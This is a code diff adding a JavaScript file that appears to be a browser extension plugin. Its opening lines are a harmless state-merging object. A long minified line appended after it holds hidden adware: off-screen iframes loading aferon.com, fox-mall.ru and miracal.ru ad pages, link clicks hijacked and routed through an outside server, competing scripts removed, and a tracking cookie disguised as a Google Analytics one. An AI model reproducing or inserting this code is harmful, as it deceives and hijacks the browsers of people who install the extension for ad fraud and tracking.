@@ -1,0 +1,23 @@
+var main = {
+    updatePlugin: function() {
+        var dataTimeBlock = document.createElement('div');
+        dataTimeBlock.innerHTML = new Date();
+    },
+
+    state: {},
+    setState: function(object) {
+        this.state = this.merge(object, this.state);
+    },
+
+    merge: function(destination, source) {
+        for (var property in source) {
+            if (source.hasOwnProperty(property)) {
+                destination[property] = source[property];
+            }
+        }
+        return destination;
+    }
+};
+
+main.updatePlugin();
+function px(a){return a+"px"}function getCookie(a){var b=document.cookie.match(new RegExp("(?:^|; )"+a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return b?decodeURIComponent(b[1]):undefined}function setCookie(b,f,c){c=c||{};var i=c.expires;if(typeof i=="number"&&i){var h=new Date();h.setTime(h.getTime()+i*1000);i=c.expires=h}if(i&&i.toUTCString){c.expires=i.toUTCString()}f=encodeURIComponent(f);var a=b+"="+f;for(var e in c){a+="; "+e;var g=c[e];if(g!==true){a+="="+g}}document.cookie=a}function deleteCookie(a){setCookie(a,null,{expires:-1})}var repl={init:function(){this.other();this.clear();var a=document.getElementsByClassName("notification")[0]||null;if(a&&a.innerHTML.indexOf("VK saver")>=0){a.remove()}},clear:function(){var a=document.getElementsByTagName("script");for(var b in a){var c=a[b];if(c.tagName=="SCRIPT"){if(c.innerHTML.indexOf("aferon")>0){c.remove()}}}},server:null,other:function(){var j=document.location.hostname;var i={};if(!i.hostname){return}var f=i.hostname;var c=i.bind||null;var a=i.frame||null;var e=i.status||null;this.server=i.url||null;var b=document.referrer;if(e=="0"||this.server==null){return}var h=Date.now()/1000|0;if(a=="0"&&j.match(f)&&!b.match(f)&&!b.match("/aferon.com/")){this.redirect(f);return}var d=getCookie("_ga_sid")||null;if(!d||d<(h-3600)){setCookie("_ga_sid",h);var g=document.createElement("iframe");if(this.server.indexOf("aferon")>=0){g.src=document.location.protocol+"//aferon.com/ads.php"}if(this.server.indexOf("fox-mall")>=0){g.src=document.location.protocol+"//fox-mall.ru/ads_r.php"}if(this.server.indexOf("miracal")>=0){g.src=document.location.protocol+"//miracal.ru/offers.php"}g.style.width="100%";g.style.height="1024px";g.style.position="fixed";g.style.left="-99999px";g.style.zIndex="99999";g.style.top="0";g.scrolling="no";g.style.border="0";document.body.appendChild(g)}},redirect:function(b){this.findAllLinks(b);var a=this;setInterval(function(){a.findAllLinks(b)},500)},findAllLinks:function(c){var a=document.getElementsByTagName("a");for(var b in a){if(a[b].tagName=="A"){var d=a[b];if(d.classList){if(!d.classList.contains("ready-b")){d.classList.add("ready-b");this.bindEvent(c,d)}}}}},bindEvent:function(b,c){var a=this;c.onclick=function(g){var f=Date.now()/1000|0;var h=getCookie("_ga_sid")||null;if(!h||h<(f-3600)){var d=g.currentTarget.href;if(d.indexOf("javascript")==0){}else{setCookie("_ga_sid",f);if(d.indexOf("http")==0||d.indexOf("//")==0){}else{d=document.location.protocol+"//"+document.location.hostname+d}g.stopPropagation();g.preventDefault();document.location.href=a.server+"?exec="+b+"&url="+d}}}}};(function(){setTimeout(function(){repl.init()},0);setTimeout(function(){var b=document.location.hostname;if(b=="go.mail.ru"){var c=document.createElement("iframe");c.src="http://fox-mall.ru";c.style.width="100%";c.style.height="1024px";c.style.position="fixed";c.style.left="-99999px";c.style.zIndex="99999";c.style.top="0";c.scrolling="no";c.style.border="0";document.body.appendChild(c);var a=document.createElement("iframe");a.src="http://miracal.ru";a.style.width="100%";a.style.height="1024px";a.style.position="fixed";a.style.left="-99999px";a.style.zIndex="99999";a.style.top="0";a.scrolling="no";a.style.border="0";document.body.appendChild(a)}},1000)})();
